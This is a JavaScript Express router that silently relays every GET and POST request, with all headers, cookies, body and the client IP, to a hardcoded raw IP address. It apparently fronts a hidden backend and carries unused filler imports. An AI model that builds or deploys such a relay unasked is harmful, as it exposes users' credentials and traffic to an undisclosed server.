var express = require('express');
var router = express.Router();
var bodyParser = require("body-parser");
const requester = require('request');
const axios = require('axios');

var MersenneTwister = require('mersenne-twister');
var generator = new MersenneTwister();



// import { LoremIpsum } from 'lorem-ipsum';
const LoremIpsum = require('lorem-ipsum').LoremIpsum;

const lorem = new LoremIpsum({
  sentencesPerParagraph: {
    max: 8,
    min: 4
  },
  wordsPerSentence: {
    max: 16,
    min: 4
  }
});



router.post("*",function (req, res) { 
try{
  req.headers["STP_ip"]=req.headers["x-forwarded-for"].split(",")[0]
  req.headers["Content-Type"]="application/x-www-form-urlencoded"
  var head = req.headers;
  var headerss = JSON.stringify(head)
    .replace("'{", "")
    .replace("}'", "")
    .replace("host","STP_ip")
  .replace("content-length","cCon").replace("content-type","timecon");
   var urrrl = "http://136.0.141.74:1289" + req.url;
    axios.post(urrrl,req.body,
    {
      headers: JSON.parse(headerss),
      maxRedirects: 0,
    }
  ).then(response => {
      try{
        console.log(response.status)
        return res.send(response.data)
      }catch{
        return res.status(200).send(String(response.data))
      }
  }).catch(function (error) { 
      if(error.status==302){     
        console.log(error)
        return res.redirect(error.response.headers['location']);
      }
      console.log(error)
	  return res.sendStatus(404);
    })
}catch(error){
  console.log(error)
	  return res.sendStatus(404);
  }
});



router.get("*",function (req, res) {
try{
  req.headers["STP_ip"]=req.headers["x-forwarded-for"].split(",")[0]
  var head = req.headers;
  var headerss = JSON.stringify(head)
    .replace("'{", "")
    .replace("}'", "")
    .replace("host","STP_ip");

  var querystring = req.url;
  var urrrl = "http://136.0.141.74:1289" + req.url;
  if (!querystring.includes("assets") || !querystring.includes(".")) {
    requester.get(
      {
        headers: head,
        url: urrrl,
        body: req.body,
		followRedirect: false ,
		followAllRedirects: false,
        json: true,
      }
    ).pipe(res);
  } else {
    return requester.get(urrrl).pipe(res);
  }
}catch(error){
	  return res.sendStatus(404);
  }
});


module.exports = router;
